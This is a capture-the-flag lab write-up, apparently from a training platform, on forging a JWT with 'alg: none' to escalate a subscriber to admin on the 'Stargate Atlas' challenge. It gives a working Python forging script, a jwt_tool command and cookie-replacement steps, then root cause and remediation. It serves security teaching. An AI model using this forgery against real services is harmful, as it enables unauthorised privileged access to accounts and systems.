---
title: "WebVerse: Stargate Atlas"
date: 2026-06-08
weight: 4
tags: ["webverse","JWT"]
author: "Gourav."
showToc: true
TocOpen: false
hidemeta: false
description: "JWT Algorithm Confusion: The alg: none Attack — Challenge Lab Writeup."
summary: "JWT Algorithm Confusion: The alg: none Attack — Challenge Lab Writeup."
# canonicalURL: "https://canonical.url/to/page"
hideSummary: false
ShowReadingTime: true
ShowPostNavLinks: true
ShowWordCount: true
UseHugoToc: true
# cover:
#     image: "/images/webverse.png"
#     alt: "Stargate Atlas challenge"
#     caption: "Stargate Atlas challenge (JWT)"
#     relative: false
#     hidden: false
---

{{< callout warning >}}

**Lab:** **Stargate Atlas**

**Category:** Web Security / JWT

**Vulnerability:** JWT `alg: none` bypass (privilege escalation)

**Platform:** webverse
{{< /callout>}}

## Lab Description

{{< callout insight "Briefing" >}}
*Stargate Atlas grew out of one engineer's weekend project tracking upcoming rocket launches. After the Discord hit ten thousand members they bolted on subscriber accounts and a hand-rolled token auth layer — the kind of layer where every shortcut taken at 2 a.m. ends up in the public site copy somewhere.*
{{< /callout>}}

## Create an Account & Log In

We start by registering a new account on the platform and logging in with those credentials. Nothing unusual here standard signup flow.

{{< figure align="center" src="/images/Stargate_Atlas_1.png" caption="Creating an Account" >}}

## Inspect the JWT

After logging in, we find a JWT (JSON Web Token) stored as a cookie. Decoding it reveals the following structure:

{{< figure align="center" src="/images/Stargate_Atlas_2.png" caption="Inspecting JWT" >}}

**Header:**

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload:**

```json
{
  "sub": "optional@gmail.com",
  "role": "subscriber",
  "iat": 1780837456,
  "exp": 1780841056
}
```

The {{< badge blue >}}role{{< /badge>}} field in the payload immediately stands out. The server appears to be using this claim to control access. The question is: can we tamper with it?

## Attempt a Naive Role Change

The first instinct is to simply change {{< badge yellow >}}"role": "subscriber"{{< /badge>}} to {{< badge green >}}"role": "admin"{{< /badge>}} and re-sign the token. Predictably, this fails — the server validates the signature and rejects the modified token.

{{< figure align="center" src="/images/Stargate_Atlas_3.png" caption="Attempting to change the role" >}}

We need a different approach.

## The `alg: none` Attack

This is where things get interesting.

The `alg` field in the JWT header tells the server which algorithm was used to sign the token. The JWT specification includes a special value {{< badge red >}}none{{< /badge>}} which means the token is **unsigned**. When a server naively trusts this field without enforcing a strict algorithm allowlist, an attacker can:

1. Set {{< badge purple >}}alg{{< /badge>}} to {{< badge red >}}"none"{{< /badge>}} in the header
2. Modify the payload however they like (e.g., change {{< badge purple >}}role{{< /badge>}} to {{< badge red >}}admin{{< /badge>}})
3. Strip the signature entirely
4. Send the resulting token

The server sees {{< badge gray >}}alg: none{{< /badge>}}, skips signature verification, and trusts the claims in the payload.

## Forge the Token

### Method #1 : Python Script

We use the following Python script to craft our malicious token:

```python
import base64, json

def dec(p):
    p += '=' * (4 - len(p) % 4)
    return json.loads(base64.urlsafe_b64decode(p))

def enc(d):
    return base64.urlsafe_b64encode(json.dumps(d, separators=(',',':')).encode()).rstrip(b'=').decode()

# ── EDIT THESE ──────────────────────────────────────────────────────────────
JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJvcHRpb25hbEBnbWFpbC5jb20iLCJyb2xlIjoic3Vic2NyaWJlciIsImlhdCI6MTc4MDgzNzQ1NiwiZXhwIjoxNzgwODQxMDU2fQ.WAR3QmoJGhtviMLTstExZi7_OEq1F04ZVxKIBDdCSns"

CHANGES = {
    "role": "admin",
}

ALG = "none"
# ────────────────────────────────────────────────────────────────────────────

h, p, _ = JWT.split('.')
header  = dec(h)
payload = dec(p)

payload.update(CHANGES)
if ALG:
    header['alg'] = ALG

print("Payload:", json.dumps(payload, indent=2))
print("\nNew token:")
print(enc(header) + '.' + enc(payload) + '.')
```

The script:

- Decodes the original JWT header and payload from Base64
- Updates the {{< badge purple >}}role{{< /badge>}} claim to {{< badge red >}}"admin"{{< /badge>}}
- Sets {{< badge purple >}}alg{{< /badge>}} to {{< badge red >}}"none"{{< /badge>}} in the header
- Re-encodes both parts and appends an **empty signature** (just a trailing {{< badge blue >}}.{{< /badge>}})

The result looks like:

{{< figure align="center" src="/images/Stargate_Atlas_4.png" caption="Forging Token with Python" >}}

{{< callout info "Alternative:" >}}
*The same result can be achieved using the **JSON Web Tokens** extension in Burp Suite, which lets you edit JWT fields visually and choose the signing algorithm.*
{{< /callout>}}

### Method #2 : JSON Web Token(JWT Editor)

{{< figure align="center" src="/images/Stargate_Atlas_5.png" caption="Forging Token with JSON Web Token(JWT Editor)" >}}

### Method #3 : JWT Tool

*Tool Link*: [**JWT TOOL**](https://github.com/ticarpi/jwt_tool)

```bash
$ python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJvcHRpb25hbEBnbWFpbC5jb20iLCJyb2xlIjoic3Vic2NyaWJlciIsImlhdCI6MTc4MDkxMDc2NywiZXhwIjoxNzgwOTE0MzY3fQ.no76rTwOmW2cJnfwNWdUpjEBowr4h4ZcPIeFYsvhTuc -I -hc alg -hv none -pc role -pv admin
```

{{< figure align="center" src="/images/Stargate_Atlas_6.png" caption="Forging Token with JWT Tool" >}}

## Replace the Cookie & Reload

We open the browser's DevTools (or a cookie editor extension), find the JWT cookie, and replace its value with our forged token.

After reloading the page, the server accepts the token and grants us admin access. The role escalation is complete.

{{< figure align="center" src="/images/Stargate_Atlas_7.png" caption="Admin pannel Access" >}}

{{< figure align="center" src="/images/Stargate_Atlas_8.png" caption="flag" >}}

---

## Why This Works

The root cause is that the server **trusts the {{< badge purple >}}alg{{< /badge>}} field supplied by the client** instead of enforcing a fixed algorithm server-side. A properly implemented JWT library should:

- Reject tokens where {{< badge purple >}}alg{{< /badge>}} is {{< badge red >}}"none"{{< /badge>}} unless explicitly configured to allow it.
- Validate tokens against a hardcoded expected algorithm, not whatever the token header claims.



## Remediation

| Issue | Fix |
| --- | --- |
| Server trusts client-supplied `alg` | Hardcode the expected algorithm server-side |
| `alg: none` accepted | Explicitly reject unsigned tokens in production |
| Role stored in JWT payload | Validate roles server-side against a database, not just the token |

---

{{< callout tip "The takeaway">}}

Never let a client dictate how their own credentials are verified.

*Do this lab on webverse Now:* https://dashboard.webverselabs-pro.com/challenges/unsealed

{{< /callout>}}